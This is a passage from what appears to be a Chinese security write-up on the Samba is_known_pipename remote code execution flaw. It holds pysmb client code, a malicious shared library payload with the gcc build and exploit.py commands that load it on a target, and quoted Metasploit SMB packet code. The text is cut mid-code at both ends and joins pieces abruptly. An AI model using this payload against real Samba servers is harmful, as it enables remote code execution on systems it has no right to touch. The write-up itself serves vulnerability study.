            if path not in self.connected_trees:
                def connectCB(connect_message, **kwargs):
                    messages_history.append(connect_message)
                    if connect_message.status == 0:
                        self.connected_trees[path] = connect_message.tid
                        connectSrvSvc(connect_message.tid)
                    else:
                        errback(OperationFailure('Failed to list shares: Unable to connect to IPC$', messages_history))
                m = SMB2Message(SMB2TreeConnectRequest(r'\\%s\%s' % ( self.remote_name.upper(), path )))
                self._sendSMBMessage(m)
                self.pending_requests[m.mid] = _PendingRequest(m.mid, expiry_time, connectCB, errback, path = path)
                messages_history.append(m)
            else:
                connectSrvSvc(self.connected_trees[path])
        # Don't convert to Window style path
        def _retrieveFileFromOffset_SMB1Unix(self, service_name, path, file_obj, callback, errback, starting_offset, max_length, timeout = 30):
            if not self.has_authenticated:
                raise NotReadyError('SMB connection not authenticated')
            messages_history = [ ]
            def sendOpen(tid):
                m = SMBMessage(ComOpenAndxRequest(filename = path,
                                                  access_mode = 0x0040,  # Sharing mode: Deny nothing to others
                                                  open_mode = 0x0001,    # Failed if file does not exist
                                                  search_attributes = SMB_FILE_ATTRIBUTE_HIDDEN | SMB_FILE_ATTRIBUTE_SYSTEM,
                                                  timeout = timeout * 1000))
                m.tid = tid
                self._sendSMBMessage(m)
                self.pending_requests[m.mid] = _PendingRequest(m.mid, int(time.time()) + timeout, openCB, errback)
                messages_history.append(m)
            def openCB(open_message, **kwargs):
                messages_history.append(open_message)
                if not open_message.status.hasError:
                    if max_length == 0:
                        closeFid(open_message.tid, open_message.payload.fid)
                        callback(( file_obj, open_message.payload.file_attributes, 0 ))
                    else:
                        sendRead(open_message.tid, open_message.payload.fid, starting_offset, open_message.payload.file_attributes, 0, max_length)
                else:
                    errback(OperationFailure('Failed to retrieve %s on %s: Unable to open file' % ( path, service_name ), messages_history))
            def sendRead(tid, fid, offset, file_attributes, read_len, remaining_len):
                read_count = self.max_raw_size - 2
                m = SMBMessage(ComReadAndxRequest(fid = fid,
                                                  offset = offset,
                                                  max_return_bytes_count = read_count,
                                                  min_return_bytes_count = min(0xFFFF, read_count)))
                m.tid = tid
                self._sendSMBMessage(m)
                self.pending_requests[m.mid] = _PendingRequest(m.mid, int(time.time()) + timeout, readCB, errback, fid = fid, offset = offset, file_attributes = file_attributes,
                                                               read_len = read_len, remaining_len = remaining_len)
            def readCB(read_message, **kwargs):
                # To avoid crazy memory usage when retrieving large files, we do not save every read_message in messages_history.
                if not read_message.status.hasError:
                    read_len = kwargs['read_len']
                    remaining_len = kwargs['remaining_len']
                    data_len = read_message.payload.data_length
                    if max_length > 0:
                        if data_len > remaining_len:
                            file_obj.write(read_message.payload.data[:remaining_len])
                            read_len += remaining_len
                            remaining_len = 0
                        else:
                            file_obj.write(read_message.payload.data)
                            remaining_len -= data_len
                            read_len += data_len
                    else:
                        file_obj.write(read_message.payload.data)
                        read_len += data_len
                    if (max_length > 0 and remaining_len 
    #include 
    int samba_init_module(){
        printf("Hi Samba. \n from: Fuck");
        system("id > /home/samba/Fuck.txt");
        return 0;
    }
    gcc  -fPIC -shared  samba_hack.c -o samba_hack.so
    /home/samba/samba_hack.so
    python exploit.py -t 192.168.206.128 -m /home/samba/samba_hack.so
**Relevant Link:**
    https://www.exploit-db.com/exploits/42060/
    https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb
    https://www.seebug.org/vuldb/ssvid-93139#0-tsina-1-55374-397232819ff9a47a7b7e80a40613cfe1
    https://www.theregister.co.uk/2017/05/25/fatthumbed_dev_slashes_samba_security/
**2\. 漏洞代码原理分析**
MSF发送的最核心payload本质上一个SMB数据包，即通过SMB协议打开一个named pipe文件
    # Returns a SMB_CREATE_RES response for a given named pipe
      def create_pipe(filename, disposition = 1, impersonation = 2)
        self.create(filename)
      end
      # Creates a file or opens an existing pipe
      def create(filename, disposition = 1, impersonation = 2, do_recv = true)
        pkt = CONST::SMB_CREATE_PKT.make_struct
        self.smb_defaults(pkt['Payload']['SMB'])
        pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX
        pkt['Payload']['SMB'].v['Flags1'] = 0x18
        if self.require_signing
          #ascii
          pkt['Payload']['SMB'].v['Flags2'] = 0x2807
        else
          #ascii
          pkt['Payload']['SMB'].v['Flags2'] =  0x2801
        end
        pkt['Payload']['SMB'].v['WordCount'] = 24
        pkt['Payload'].v['AndX'] = 255
        pkt['Payload'].v['FileNameLen'] = filename.length